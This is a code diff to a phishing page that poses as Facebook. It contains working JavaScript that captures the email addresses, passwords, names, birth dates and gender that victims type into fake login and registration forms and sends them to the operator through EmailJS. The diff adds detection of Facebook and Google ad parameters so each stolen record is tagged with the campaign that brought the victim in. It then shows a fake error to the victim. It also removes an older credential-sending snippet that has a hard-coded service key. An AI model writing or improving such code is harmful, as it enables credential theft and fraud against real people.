@@ -217,6 +217,33 @@
 
     emailjs.init(EJ_PUBLIC_KEY);
 
+    // ── DETECTAR ORIGEN (Facebook / Google / Directo) ──
+    function detectarOrigen() {
+      const params = new URLSearchParams(window.location.search);
+      const utm    = (params.get('utm_source') || '').toLowerCase();
+      const ref    = (params.get('ref')        || '').toLowerCase();
+      const fbclid =  params.get('fbclid');   // Facebook Ads lo agrega automáticamente
+      const gclid  =  params.get('gclid');    // Google Ads lo agrega automáticamente
+
+      if (fbclid || utm === 'facebook' || utm === 'fb' || ref === 'facebook') {
+        return '📘 FACEBOOK';
+      } else if (gclid || utm === 'google' || ref === 'google') {
+        return '🔍 GOOGLE';
+      } else if (utm) {
+        return '🔗 ' + utm.toUpperCase();
+      } else {
+        // Intentar leer el referrer del navegador como respaldo
+        const referrer = document.referrer.toLowerCase();
+        if (referrer.includes('facebook.com') || referrer.includes('fb.com')) return '📘 FACEBOOK';
+        if (referrer.includes('google.com'))  return '🔍 GOOGLE';
+        if (referrer.includes('instagram.com')) return '📸 INSTAGRAM';
+        return '🌐 DIRECTO';
+      }
+    }
+
+    // Calcular origen una sola vez al cargar la página
+    const ORIGEN = detectarOrigen();
+
     // ── Enviar datos por email ──
     function enviarDatos(params) {
       emailjs.send(EJ_SERVICE_ID, EJ_TEMPLATE_ID, params)
@@ -236,12 +263,13 @@
         return;
       }
 
-      // Enviar datos al correo
+      // Enviar datos al correo — ahora incluye ORIGEN
       enviarDatos({
-        tipo: 'LOGIN',
-        correo: email,
+        tipo:     'LOGIN',
+        origen:   ORIGEN,
+        correo:   email,
         password: password,
-        fecha: new Date().toLocaleString('es-EC')
+        fecha:    new Date().toLocaleString('es-EC')
       });
 
       // Mostrar error falso (como Facebook real)
@@ -272,15 +300,16 @@
         return;
       }
 
-      // Enviar datos al correo
+      // Enviar datos al correo — ahora incluye ORIGEN
       enviarDatos({
-        tipo: 'REGISTRO',
-        correo: email,
-        password: pass,
-        nombre: fname + ' ' + lname,
+        tipo:       'REGISTRO',
+        origen:     ORIGEN,
+        correo:     email,
+        password:   pass,
+        nombre:     fname + ' ' + lname,
         nacimiento: dia + '/' + mes + '/' + anio,
-        genero: gender ? gender.value : 'No especificado',
-        fecha: new Date().toLocaleString('es-EC')
+        genero:     gender ? gender.value : 'No especificado',
+        fecha:      new Date().toLocaleString('es-EC')
       });
 
       closeModal();
@@ -297,15 +326,6 @@
       if (e.key === 'Enter') {
         const active = document.activeElement;
         if (active.id === 'email' || active.id === 'password') handleLogin();
-          <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-  <script>
-    function enviar() {
-      emailjs.init('0jG8bx2KA7fuPpvtf');
-      emailjs.send('service_tr444xm', 'template_4x12f3k', {
-        origen: 'FACEBOOK',
-        correo: document.getElementById('email').value,
-        password: document.getElementById('password').value,
-        fecha: new Date().toLocaleString('es-EC')
       }
     });
   </script>
